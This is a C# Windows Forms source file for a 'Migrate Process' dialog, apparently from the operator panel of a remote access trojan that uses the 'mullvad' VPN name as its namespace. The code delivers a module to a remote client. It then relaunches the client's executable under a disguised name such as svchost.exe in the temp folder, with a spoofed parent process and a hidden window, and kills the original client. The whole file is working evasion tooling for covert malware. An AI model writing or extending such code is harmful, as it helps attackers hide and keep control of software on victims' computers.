using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class MigrateProcessForm : Form
{
    private const string ModuleFile = "mullvad.Module.MigrateProcess";
    private const string ModuleId   = "mullvad.migrate";

    // ── Controls ─────────────────────────────────────────────────────────────
    private GroupBox  grpProcess  = null!;
    private Label     lblName     = null!;
    private TextBox   txtName     = null!;
    private Label     lblDestDir  = null!;
    private TextBox   txtDestDir  = null!;
    private Button    btnPickDir  = null!;
    private Label     lblPath     = null!;
    private TextBox   txtPath     = null!;
    private Button    btnBrowse   = null!;
    private Label     lblArgs     = null!;
    private TextBox   txtArgs     = null!;

    private GroupBox  grpOptions  = null!;
    private Label     lblPpid     = null!;
    private TextBox   txtPpid     = null!;
    private CheckBox  chkHidden   = null!;

    private Label     lblStatus   = null!;
    private Button    btnCancel   = null!;
    private Button    btnMigrate  = null!;

    // ── Mode ─────────────────────────────────────────────────────────────────
    private readonly ClientHandler? _handler;
    private readonly bool _autoTaskMode;

    public string? MigrationParams { get; private set; }

    // ─────────────────────────────────────────────────────────────────────────
    //  Factory
    // ─────────────────────────────────────────────────────────────────────────
    public static void ShowImmediate(Form owner, ClientHandler handler)
    {
        using var frm = new MigrateProcessForm(handler, autoTaskMode: false);
        ThemeManager.ApplyForm(frm);
        frm.ShowDialog(owner);
    }

    public static string? GetParamsDialog(Form owner)
    {
        using var frm = new MigrateProcessForm(handler: null, autoTaskMode: true);
        ThemeManager.ApplyForm(frm);
        frm.ShowDialog(owner);
        return frm.MigrationParams;
    }

    private MigrateProcessForm(ClientHandler? handler, bool autoTaskMode)
    {
        _handler      = handler;
        _autoTaskMode = autoTaskMode;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text            = _autoTaskMode ? "Migrate Process — Add Task" : "Migrate Process";
        ClientSize      = new Size(444, 330);
        FormBorderStyle = FormBorderStyle.FixedDialog;
        MaximizeBox     = false;
        MinimizeBox     = false;
        StartPosition   = FormStartPosition.CenterParent;
        Font            = new Font("Segoe UI", 9F);

        var ico = IconLoader.Load("application_delete.png");
        if (ico != null) Icon = Icon.FromHandle(((Bitmap)ico).GetHicon());

        // ── New Process group ────────────────────────────────────────────────
        grpProcess = new GroupBox
        {
            Text  = "New Process",
            Left  = 12, Top = 8,
            Width = 416, Height = 148,
        };

        lblName = new Label { Text = "Name:", Left = 8, Top = 22, Width = 56, AutoSize = true };
        txtName = new TextBox
        {
            Left            = 70, Top = 19,
            Width           = 334,
            PlaceholderText = "e.g. svchost.exe",
        };

        lblDestDir = new Label { Text = "Dest Dir:", Left = 8, Top = 52, Width = 56, AutoSize = true };
        txtDestDir = new TextBox
        {
            Left            = 70, Top = 49,
            Width           = 296,
            PlaceholderText = @"%TEMP%  (leave blank for default)",
            Text            = Environment.GetEnvironmentVariable("TEMP") ?? Path.GetTempPath(),
        };
        btnPickDir = new Button
        {
            Text      = "…",
            Left      = 372, Top = 48,
            Width     = 32, Height = 23,
            FlatStyle = FlatStyle.Flat,
        };
        btnPickDir.Click += BtnPickDir_Click;

        lblPath = new Label { Text = "Exe Path:", Left = 8, Top = 82, Width = 56, AutoSize = true };
        txtPath = new TextBox
        {
            Left            = 70, Top = 79,
            Width           = 296,
            PlaceholderText = "(optional — leave blank to copy current exe)",
        };
        btnBrowse = new Button
        {
            Text      = "…",
            Left      = 372, Top = 78,
            Width     = 32, Height = 23,
            FlatStyle = FlatStyle.Flat,
        };
        btnBrowse.Click += BtnBrowse_Click;

        lblArgs = new Label { Text = "Args:", Left = 8, Top = 112, Width = 56, AutoSize = true };
        txtArgs = new TextBox
        {
            Left            = 70, Top = 109,
            Width           = 334,
            PlaceholderText = "(optional command-line arguments)",
        };

        grpProcess.Controls.AddRange(new Control[] { lblName, txtName, lblDestDir, txtDestDir, btnPickDir, lblPath, txtPath, btnBrowse, lblArgs, txtArgs });

        // ── Options group ────────────────────────────────────────────────────
        grpOptions = new GroupBox
        {
            Text  = "Options",
            Left  = 12, Top = 164,
            Width = 416, Height = 100,
        };

        lblPpid = new Label { Text = "Spoof Parent:", Left = 8, Top = 22, Width = 86, AutoSize = true };
        txtPpid = new TextBox
        {
            Left            = 100, Top = 19,
            Width           = 170,
            PlaceholderText = "e.g. explorer.exe",
        };

        chkHidden = new CheckBox
        {
            Text    = "Spawn Hidden",
            Left    = 8, Top = 55,
            Width   = 180,
            Checked = true,
        };

        grpOptions.Controls.AddRange(new Control[] { lblPpid, txtPpid, chkHidden });

        // ── Status + buttons ─────────────────────────────────────────────────
        lblStatus = new Label
        {
            Left      = 12, Top = 278,
            Width     = 226, Height = 20,
            TextAlign = ContentAlignment.MiddleLeft,
            ForeColor = SystemColors.GrayText,
            Text      = "",
        };

        btnCancel = new Button
        {
            Text         = "Cancel",
            Left         = 248, Top = 274,
            Width        = 84, Height = 28,
            FlatStyle    = FlatStyle.Flat,
            DialogResult = DialogResult.Cancel,
        };
        CancelButton = btnCancel;

        btnMigrate = new Button
        {
            Text      = _autoTaskMode ? "Add Task" : "Migrate",
            Left      = 340, Top = 274,
            Width     = 88, Height = 28,
            FlatStyle = FlatStyle.Flat,
        };
        btnMigrate.Click += BtnMigrate_Click;

        Controls.AddRange(new Control[]
        {
            grpProcess, grpOptions, lblStatus, btnCancel, btnMigrate,
        });

        ResumeLayout(false);
        PerformLayout();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Actions
    // ─────────────────────────────────────────────────────────────────────────
    private void BtnPickDir_Click(object? sender, EventArgs e)
    {
        using var dlg = new FolderBrowserDialog
        {
            Description         = "Select destination directory for the migrated executable",
            SelectedPath        = txtDestDir.Text,
            ShowNewFolderButton = true,
        };
        if (dlg.ShowDialog(this) == DialogResult.OK)
            txtDestDir.Text = dlg.SelectedPath;
    }

    private void BtnBrowse_Click(object? sender, EventArgs e)
    {
        using var dlg = new OpenFileDialog
        {
            Title  = "Select Executable",
            Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*",
        };
        if (dlg.ShowDialog(this) == DialogResult.OK)
            txtPath.Text = dlg.FileName;
    }

    private void BtnMigrate_Click(object? sender, EventArgs e)
    {
        string name = txtName.Text.Trim();
        if (string.IsNullOrWhiteSpace(name))
        {
            lblStatus.Text      = "Process name is required.";
            lblStatus.ForeColor = Color.OrangeRed;
            txtName.Focus();
            return;
        }

        string payload = BuildPayload();

        if (_autoTaskMode)
        {
            MigrationParams = payload;
            DialogResult    = DialogResult.OK;
            Close();
            return;
        }

        _ = RunMigrationAsync(payload);
    }

    private async Task RunMigrationAsync(string payload)
    {
        btnMigrate.Enabled = false;
        btnCancel.Enabled  = false;
        lblStatus.ForeColor = SystemColors.GrayText;
        lblStatus.Text      = "Delivering module…";

        var progress = new Progress<string>(msg => lblStatus.Text = msg);

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            ShowError("Module file not found.");
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(45));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler!, ModuleFile, bytes, progress, cts.Token);
        if (!ok)
        {
            ShowError("Module delivery failed.");
            return;
        }

        lblStatus.Text = "Sending migration command…";
        try
        {
            using var ctx = new ModuleContext(_handler!, ModuleId);
            string result = await ctx.ExecuteAsync("migrate", payload);

            if (result.Contains("\"status\":\"migrated\""))
            {
                lblStatus.Text      = "Migration successful — terminating old client…";
                lblStatus.ForeColor = Color.ForestGreen;

                // cleanly shut down the old client so the new process takes over
                await _handler!.TerminateAsync();

                lblStatus.Text = "Done. New process is running, old client terminated.";
            }
            else if (result.Contains("\"error\""))
            {
                var m = System.Text.RegularExpressions.Regex.Match(result, "\"error\"\\s*:\\s*\"([^\"]+)\"");
                ShowError(m.Success ? m.Groups[1].Value : result);
            }
            else
            {
                ShowError(result);
            }
        }
        catch (Exception ex)
        {
            ShowError(ex.Message);
        }
    }

    private void ShowError(string msg)
    {
        lblStatus.Text      = $"Error: {msg}";
        lblStatus.ForeColor = Color.OrangeRed;
        btnMigrate.Enabled  = true;
        btnCancel.Enabled   = true;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private string BuildPayload()
    {
        string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

        return "{"
            + $"\"name\":\"{Esc(txtName.Text.Trim())}\","
            + $"\"dest_dir\":\"{Esc(txtDestDir.Text.Trim())}\","
            + $"\"path\":\"{Esc(txtPath.Text.Trim())}\","
            + $"\"args\":\"{Esc(txtArgs.Text.Trim())}\","
            + $"\"ppid\":\"{Esc(txtPpid.Text.Trim())}\","
            + $"\"hidden\":{(chkHidden.Checked ? "true" : "false")}"
            + "}";
    }
}
